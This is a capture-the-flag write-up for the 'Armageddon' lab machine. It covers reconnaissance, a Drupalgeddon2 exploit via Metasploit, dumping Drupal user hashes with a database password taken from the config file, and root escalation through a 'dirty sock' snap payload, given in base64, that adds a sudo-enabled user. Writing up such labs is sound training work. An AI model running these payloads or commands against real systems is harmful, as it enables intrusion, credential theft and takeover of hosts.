# Armageddon

## Discovery

There's way too much.....

```
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon
```

```
/scripts              (Status: 301) [Size: 236] [--> http://10.10.10.233/scripts/]
/misc                 (Status: 301) [Size: 233] [--> http://10.10.10.233/misc/]   
/modules              (Status: 301) [Size: 236] [--> http://10.10.10.233/modules/]
/themes               (Status: 301) [Size: 235] [--> http://10.10.10.233/themes/] 
/includes             (Status: 301) [Size: 237] [--> http://10.10.10.233/includes/]
/profiles             (Status: 301) [Size: 237] [--> http://10.10.10.233/profiles/]
/sites                (Status: 301) [Size: 234] [--> http://10.10.10.233/sites/] 
```

The `robots.txt` is full of valuable informations too:

```
# Directories
Disallow: /includes/
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/
# Files
Disallow: /CHANGELOG.txt
Disallow: /cron.php
Disallow: /INSTALL.mysql.txt
Disallow: /INSTALL.pgsql.txt
Disallow: /INSTALL.sqlite.txt
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php
# Paths (clean URLs)
Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/
# Paths (no clean URLs)
Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/
```

The `CHANGELOG.txt` gives the version of Drupal:

```
Drupal 7.56, 2017-06-21
-----------------------
- Fixed security issues (access bypass). See SA-CORE-2017-003.
```

There are a lot of potential vectors, but the name of the box suggests that
we take a path involving one of the "Drupalgeddon" exploits.

## Drupalgeddon

There's so much to explore, I want to do it quickly! Let's use Metasploit for once.

`Drupalgeddon2` works and gives us a meterpreter as "apache".

##  Lateral movement

The php settings for the website contain informations about the MySql database:

```php
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

Since our shell is non interactive, the database must be queried from the shell:

```bash
mysql  -Ddrupal -udrupaluser -pCQHEy@9M*m23gBVj -e 'show tables;'
mysql  -Ddrupal -udrupaluser -pCQHEy@9M*m23gBVj -e 'show columns from users;'
mysql  -Ddrupal -udrupaluser -pCQHEy@9M*m23gBVj -e 'select name,pass from users;'
```

```
brucetherealadmin $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
aadmin $S$DWDmtZoQU1qVA6bMlEe61RL9RUdHd83Tzbet2w3JhX82PFwiBJVi
test@test.com $S$D0RtGvnEIn90BWChKu.sKaj8Hy5H7UPRytLNAUoPkewksq76iYA.
```

This `Drupal7` format hash can be easily cracked with the `rockyou` wordlist.

## Escalation

"brucetherealadmin" can execute `/usr/bin/snap install *` as root without
entering his password.

Snap had a vulnerability called the "dirty socks", we can lift a payload from
an exploitation script and directly install it.

Most available scripts perform the attack via a POST request to the snap daemon.
But "brucetherealadmin" can only use the cli.

Using the script from [initstring][dirty-socks-script], we dump the payload to a file:

```bash
python -c "print('aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw' + 'A' * 4256 + '==')" | base64 -d > 1337.snap
```

Then install it:

```bash
sudo snap install --devmode 1337.snap
```

There's now a "dirty_sock" user with root privileges!

[dirty-socks-script]: https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py
